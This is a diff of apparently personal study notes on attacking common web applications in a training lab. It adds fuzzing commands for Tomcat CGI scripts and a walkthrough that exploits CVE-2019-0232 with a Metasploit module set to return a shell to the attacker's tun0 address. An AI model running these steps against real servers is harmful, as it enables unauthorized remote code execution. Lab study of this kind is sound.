@@ -1,5 +1,7 @@
 #CWES #methodology #wordpress #joomla #drupal #jenkins #splunk #osticket #PRTG #gitlab #coldfusion 
 
+#### Lessons:
+- If we get a domain: `*.domain.com` we should always try to vhost fuzz it or subdomain fuzz it. (vhost fuzzing gobuster is good, remeber to add the top domain to our etc host before)
 
 #### Common applications:
 ![[Pasted image 20260717085257.png]]
@@ -185,7 +187,6 @@ CVE and exploit:
 
 Allows us to read sensitive files like WEB-INF/web.xml
 
-0ptions_ind3xeS_ftw!
 
 **Attacking tomcat cgi:** (common gateway interface)
 - CGI servlet component in apache tomcat that enables web servers to communicate with external applications beyond the tomcat jvm.
@@ -194,7 +195,7 @@ Allows us to read sensitive files like WEB-INF/web.xml
 CVE-2019-0232:
 - We can get rce via CGI scripts 
 - Mainly a windows related vulnerability
-- First check that tomcat is running with a vulnerable version, then fuzz the /cgi directory: (Change up the extensions, .cmd, .bat, .ps1)
+- First check that tomcat is running with a vulnerable version, then fuzz the /cgi directory: (**Change up the extensions, .cmd, .bat, .ps1!! if .cmd did not work, try .bat etc.)**
 ```shell
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
 ```
@@ -443,3 +444,25 @@ $password = "*";
 - Regular patches, and backups
 - Integrate login via Active Directory
 - Only expose what is necessary to the internet 
+
+
+#### Assignment 1:
+- Scan the ports, and we find a Jenkins and a tomcat instance 
+- We find the tomcat version, and see that it is a common vulnerable one with many vulnerabilities 
+- We dont get any of the exploits to work, probably because we are not logged in to tomcat 
+- We enumerate a bit more, and look for cgi files, and find a cmd.bat
+Alternative way to enumerate this:
+```
+gobuster dir -u http://STMIP:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
+```
+- We can execute some commands via the url or curl, but some does not work.
+- We find a msfconsole module for this vulnerability and set it up:
+
+```
+set RHOSTS STMIP
+set TARGETURI /cgi/cmd.bat
+set LHOST tun0
+set FORCEEXPLOIT true
+```
+
+This gives us a shell. 
